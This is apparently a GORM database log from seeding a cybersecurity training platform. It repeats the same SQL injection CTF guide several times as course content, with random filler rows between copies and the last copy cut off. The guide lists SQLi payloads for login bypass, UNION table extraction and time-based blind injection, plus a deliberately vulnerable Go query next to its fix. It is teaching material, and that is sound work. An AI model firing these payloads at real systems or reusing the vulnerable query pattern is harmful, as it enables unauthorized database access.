2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.417ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.496ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 80 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[7.354ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.23','2025-06-09 14:07:55.23',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,80) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.476ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[16.726ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.242','2025-06-09 14:07:55.242',NULL,'cyber security and qtxmy','WoqgijVXDCNIRYNZsFJukcBmsAFJIVCIuxpecHHMrbrIxUJAmYuVOjhGOONVmCitEWeIRGFKCkvMRKLPsvQnfZCKfZPHEPYytNSQ',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.516ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[3.636ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 81 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[11.254ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.257','2025-06-09 14:07:55.257',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,81) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.467ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[11.304ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.265','2025-06-09 14:07:55.265',NULL,'cyber security and jdfsb','MnbPRTUJQLOtCzjgZkeQvUHqXPwhTpcASaaBLLXcrMBGKsZgJYiuVztwNZeFVkjdpnAxFmXjWhAJIXHjMtPyoJCGSEvBWhfDffeS',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.484ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.541ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 82 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[9.044ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.277','2025-06-09 14:07:55.277',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,82) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.473ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.149ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.286','2025-06-09 14:07:55.286',NULL,'cyber security and bjfcw','BUgvwTpQNpTvIInitBsvIEheNwGGENlwPQnioDirggpaMrKsDiCHNDraMynbWEayaykbicZDMuQTCyIUPPtfaGstdqFWfPMTJwcB',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.445ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.452ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 83 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[11.649ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.293','2025-06-09 14:07:55.293',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,83) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.539ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[15.502ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.304','2025-06-09 14:07:55.304',NULL,'cyber security and sdvgq','IpEqWHeZJgrnyWGSohIZswFxwzzMibLPxOJveOUuXpIBPSdemhbIxOVtrmNJDXWAuJmZunItbXaWlVtUtdWhoAwInPecKiQRaOhC',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.519ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.495ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 84 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[7.661ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.32','2025-06-09 14:07:55.32',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

